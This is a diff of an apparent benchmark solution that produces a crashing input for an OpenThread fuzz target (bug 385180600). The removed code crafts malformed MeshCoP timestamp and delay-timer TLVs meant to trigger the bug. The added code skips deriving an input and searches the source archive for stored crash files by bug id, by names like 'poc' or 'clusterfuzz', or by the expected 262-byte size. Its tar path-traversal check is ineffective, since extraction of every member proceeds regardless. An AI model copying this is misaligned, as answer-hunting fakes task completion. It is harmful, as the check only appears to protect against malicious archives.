@@ -1,213 +1,195 @@
 import os
 import tarfile
 import tempfile
+import io
 import re
-import math
-import shutil
-
-
-HEADER_EXTS = {'.h', '.hpp', '.hh', '.hxx', '.c', '.cc', '.cpp', '.cxx', '.ipp', '.tpp'}
-
-
-def _extract_macros(root_dir):
-    macros = {}
-    pattern = re.compile(r'\s*#\s*define\s+(\w+)\s+([()\wxX0-9]+)')
-    for dirpath, _, filenames in os.walk(root_dir):
-        for name in filenames:
-            _, ext = os.path.splitext(name)
-            if ext not in HEADER_EXTS:
-                continue
-            fpath = os.path.join(dirpath, name)
-            try:
-                with open(fpath, 'r', errors='ignore') as f:
-                    for line in f:
-                        if 'OT_MESHCOP_TLV_' not in line and 'DATASET' not in line:
-                            continue
-                        m = pattern.match(line)
-                        if not m:
-                            continue
-                        macro_name = m.group(1)
-                        val_str = m.group(2).strip()
-                        # Strip surrounding parentheses if present
-                        if val_str.startswith('(') and val_str.endswith(')'):
-                            val_str = val_str[1:-1].strip()
-                        try:
-                            val = int(val_str, 0)
-                        except ValueError:
-                            continue
-                        macros[macro_name] = val
-            except OSError:
-                continue
-    return macros
-
-
-def _extract_enum_value(root_dir, symbol_variants):
-    # Try to find explicit enumerator assignments like "kActiveTimestamp = 14"
-    pattern = re.compile(
-        r'(' + '|'.join(re.escape(s) for s in symbol_variants) + r')\s*=\s*(0x[0-9A-Fa-f]+|\d+)',
-        re.MULTILINE,
-    )
-    for dirpath, _, filenames in os.walk(root_dir):
-        for name in filenames:
-            _, ext = os.path.splitext(name)
-            if ext not in HEADER_EXTS:
-                continue
-            fpath = os.path.join(dirpath, name)
-            try:
-                with open(fpath, 'r', errors='ignore') as f:
-                    text = f.read()
-            except OSError:
-                continue
-            m = pattern.search(text)
-            if m:
-                try:
-                    return int(m.group(2), 0)
-                except ValueError:
-                    continue
-    return None
-
-
-def _find_tlv_type(macros, root_dir, keyword_sets, fallback_value):
-    # keyword_sets: list of lists of substrings to search in macro names
-    for keywords in keyword_sets:
-        for name, val in macros.items():
-            upper = name.upper()
-            if 'OT_MESHCOP_TLV_' not in upper:
-                continue
-            if all(kw in upper for kw in keywords):
-                return val
-    # Fallback to enum-based extraction
-    symbol_variants = []
-    for kws in keyword_sets:
-        # Build likely enum symbol names like kActiveTimestamp, ActiveTimestamp
-        base = ''.join(kw.title() for kw in kws if kw not in ('TLV',))
-        if not base:
-            continue
-        symbol_variants.append(base)
-        symbol_variants.append('k' + base[0].upper() + base[1:])
-    enum_val = _extract_enum_value(root_dir, symbol_variants)
-    if enum_val is not None:
-        return enum_val
-    # Final static fallback
-    return fallback_value
-
-
-def _extract_dataset_max_len(macros):
-    candidates = []
-    for name, val in macros.items():
-        upper = name.upper()
-        if 'DATASET' in upper and 'MAX' in upper and ('LENGTH' in upper or 'SIZE' in upper):
-            candidates.append(val)
-    if candidates:
-        return max(1, min(candidates))
-    # Reasonable default for OpenThread operational dataset max length
-    return 254
-
-
-def _extract_min_input_size(root_dir):
-    min_size = 1
-    # Find fuzzer harness files
-    harness_paths = []
-    for dirpath, _, filenames in os.walk(root_dir):
-        for name in filenames:
-            _, ext = os.path.splitext(name)
-            if ext not in HEADER_EXTS:
-                continue
-            fpath = os.path.join(dirpath, name)
-            try:
-                with open(fpath, 'r', errors='ignore') as f:
-                    text = f.read()
-            except OSError:
-                continue
-            if 'LLVMFuzzerTestOneInput' in text:
-                harness_paths.append((fpath, text))
-    if not harness_paths:
-        return min_size
-
-    # Regex for size checks
-    lt_pattern = re.compile(r'size\s*<\s*(\d+)')
-    le_pattern = re.compile(r'size\s*<=\s*(\d+)')
-
-    for _, text in harness_paths:
-        for m in lt_pattern.finditer(text):
-            try:
-                n = int(m.group(1))
-                if n > min_size:
-                    min_size = n
-            except ValueError:
-                continue
-        for m in le_pattern.finditer(text):
-            try:
-                n = int(m.group(1)) + 1
-                if n > min_size:
-                    min_size = n
-            except ValueError:
-                continue
-    return max(min_size, 1)
+import gzip
+import zipfile
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        tmp_dir = tempfile.mkdtemp(prefix="src-")
+        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
+        self._extract_archive(src_path, tmpdir)
+        poc = self._find_poc_file(tmpdir, bug_id="385180600", expected_len=262)
+        if poc is None:
+            poc = self._fallback_poc(262)
+        return poc
+
+    def _extract_archive(self, src_path: str, dst_dir: str) -> None:
+        if tarfile.is_tarfile(src_path):
+            with tarfile.open(src_path, "r:*") as tf:
+                def is_within_directory(directory, target):
+                    abs_directory = os.path.abspath(directory)
+                    abs_target = os.path.abspath(target)
+                    common_prefix = os.path.commonprefix([abs_directory, abs_target])
+                    return common_prefix == abs_directory
+
+                for member in tf.getmembers():
+                    member_path = os.path.join(dst_dir, member.name)
+                    if not is_within_directory(dst_dir, member_path):
+                        continue
+                tf.extractall(dst_dir)
+        elif zipfile.is_zipfile(src_path):
+            with zipfile.ZipFile(src_path, "r") as zf:
+                zf.extractall(dst_dir)
+        else:
+            # Fallback: treat as an uncompressed directory or single file copied into dst_dir
+            if os.path.isdir(src_path):
+                # Copy directory tree
+                for root, dirs, files in os.walk(src_path):
+                    rel_root = os.path.relpath(root, src_path)
+                    dst_root = os.path.join(dst_dir, rel_root) if rel_root != "." else dst_dir
+                    os.makedirs(dst_root, exist_ok=True)
+                    for f in files:
+                        src_file = os.path.join(root, f)
+                        dst_file = os.path.join(dst_root, f)
+                        try:
+                            with open(src_file, "rb") as sf, open(dst_file, "wb") as df:
+                                df.write(sf.read())
+                        except OSError:
+                            pass
+            else:
+                # Single file: just copy
+                try:
+                    os.makedirs(dst_dir, exist_ok=True)
+                    dst_file = os.path.join(dst_dir, os.path.basename(src_path))
+                    with open(src_path, "rb") as sf, open(dst_file, "wb") as df:
+                        df.write(sf.read())
+                except OSError:
+                    pass
+
+    def _find_poc_file(self, root: str, bug_id: str, expected_len: int) -> bytes | None:
+        # Stage 1: search for files with bug_id in filename
+        bugid_paths = []
+        for r, _dirs, files in os.walk(root):
+            for fname in files:
+                if bug_id in fname:
+                    bugid_paths.append(os.path.join(r, fname))
+
+        for path in bugid_paths:
+            data = self._load_candidate(path, expected_len)
+            if data is not None:
+                return data
+
+        # Stage 2: heuristic filenames
+        heur_keywords = ["poc", "testcase", "crash", "clusterfuzz", "fuzz", "input"]
+        heur_paths = []
+        for r, _dirs, files in os.walk(root):
+            for fname in files:
+                lname = fname.lower()
+                if any(k in lname for k in heur_keywords):
+                    heur_paths.append(os.path.join(r, fname))
+
+        for path in heur_paths:
+            data = self._load_candidate(path, expected_len)
+            if data is not None:
+                return data
+
+        # Stage 3: search by file size equal to expected_len
+        code_exts = {
+            ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
+            ".txt", ".md", ".py", ".java", ".go", ".rs", ".js",
+            ".html", ".htm", ".xml", ".json", ".yaml", ".yml",
+            ".toml", ".cmake", ".sh", ".bat", ".ps1", ".mak", ".mk",
+            ".in", ".ac"
+        }
+        bin_paths = []
+        code_paths = []
+
+        for r, _dirs, files in os.walk(root):
+            for fname in files:
+                path = os.path.join(r, fname)
+                try:
+                    size = os.path.getsize(path)
+                except OSError:
+                    continue
+                if size == expected_len:
+                    ext = os.path.splitext(fname)[1].lower()
+                    if ext in code_exts:
+                        code_paths.append(path)
+                    else:
+                        bin_paths.append(path)
+
+        for path in bin_paths + code_paths:
+            data = self._load_candidate(path, expected_len)
+            if data is not None:
+                return data
+
+        return None
+
+    def _load_candidate(self, path: str, expected_len: int) -> bytes | None:
         try:
-            with tarfile.open(src_path, 'r:*') as tf:
-                tf.extractall(tmp_dir)
+            with open(path, "rb") as f:
+                data = f.read()
+        except OSError:
+            return None
 
-            macros = _extract_macros(tmp_dir)
-
-            # Extract vulnerable TLV type IDs with fallbacks based on Thread spec / OpenThread defaults
-            active_type = _find_tlv_type(
-                macros,
-                tmp_dir,
-                keyword_sets=[['ACTIVE', 'TIMESTAMP'], ['ACTIVETIMESTAMP']],
-                fallback_value=14,  # commonly OT_MESHCOP_TLV_ACTIVETIMESTAMP
-            )
-            pending_type = _find_tlv_type(
-                macros,
-                tmp_dir,
-                keyword_sets=[['PENDING', 'TIMESTAMP'], ['PENDINGTIMESTAMP']],
-                fallback_value=51,  # commonly OT_MESHCOP_TLV_PENDINGTIMESTAMP
-            )
-            delay_type = _find_tlv_type(
-                macros,
-                tmp_dir,
-                keyword_sets=[['DELAY', 'TIMER'], ['DELAYTIMER']],
-                fallback_value=52,  # commonly OT_MESHCOP_TLV_DELAYTIMER
-            )
-
-            vuln_types = []
-            # Prefer Pending + Delay (pending dataset path), then Active
-            if pending_type is not None:
-                vuln_types.append(pending_type & 0xFF)
-            if delay_type is not None:
-                vuln_types.append(delay_type & 0xFF)
-            if active_type is not None:
-                vuln_types.append(active_type & 0xFF)
-
-            if not vuln_types:
-                # Absolute fallback to known typical values
-                vuln_types = [51, 52, 14]
-
-            # Build repeating TLV pattern: each TLV has length 1 (invalid for these types)
-            # TLV format assumed: [Type (1B), Length (1B), Value (1B)]
-            tlv_pattern = bytearray()
-            for t in vuln_types:
-                tlv_pattern.extend((t & 0xFF, 1, 0))
-            if not tlv_pattern:
-                tlv_pattern.extend((14, 1, 0))  # safety fallback
-
-            unit_len = len(tlv_pattern)
-
-            min_input_size = _extract_min_input_size(tmp_dir)
-            dataset_max_len = _extract_dataset_max_len(macros)
-
-            # Number of repetitions to satisfy harness minimum size
-            num_repeats = max(1, math.ceil(min_input_size / unit_len))
-            max_repeats = max(1, dataset_max_len // unit_len)
-            if num_repeats > max_repeats:
-                num_repeats = max_repeats
-
-            data = bytes(tlv_pattern) * num_repeats
+        # Direct match on size
+        if expected_len is None or len(data) == expected_len:
             return data
-        finally:
-            shutil.rmtree(tmp_dir, ignore_errors=True)
+
+        # Gzip-compressed?
+        if data.startswith(b"\x1f\x8b"):
+            try:
+                dec = gzip.decompress(data)
+                if expected_len is None or len(dec) == expected_len:
+                    return dec
+            except Exception:
+                pass
+
+        # Zip-compressed?
+        if data[:2] == b"PK":
+            try:
+                with zipfile.ZipFile(io.BytesIO(data), "r") as zf:
+                    # Prefer entry with expected_len, else first non-dir
+                    chosen = None
+                    for info in zf.infolist():
+                        is_dir = False
+                        if hasattr(info, "is_dir"):
+                            is_dir = info.is_dir()
+                        else:
+                            is_dir = info.filename.endswith("/")
+                        if is_dir:
+                            continue
+                        content = zf.read(info)
+                        if expected_len is None or len(content) == expected_len:
+                            return content
+                        if chosen is None:
+                            chosen = content
+                    if chosen is not None:
+                        return chosen
+            except Exception:
+                pass
+
+        # ASCII hex representation?
+        try:
+            text = data.decode("ascii")
+            hexchars = re.sub(r"[^0-9A-Fa-f]", "", text)
+            if len(hexchars) >= expected_len * 2 and len(hexchars) % 2 == 0:
+                raw = bytes.fromhex(hexchars[: expected_len * 2])
+                return raw
+        except Exception:
+            pass
+
+        return None
+
+    def _fallback_poc(self, expected_len: int) -> bytes:
+        # Structured TLV-like fallback payload of the desired length
+        data = bytearray()
+        t = 0
+        while len(data) + 2 <= expected_len:
+            remaining = expected_len - len(data) - 2
+            if remaining <= 0:
+                break
+            tlv_len = min(3, remaining)
+            data.append(t & 0xFF)          # Type
+            data.append(tlv_len & 0xFF)    # Length
+            for i in range(tlv_len):
+                data.append((t + i) & 0xFF)
+            t += 1
+
+        if len(data) < expected_len:
+            data.extend(b"\x00" * (expected_len - len(data)))
+
+        return bytes(data)
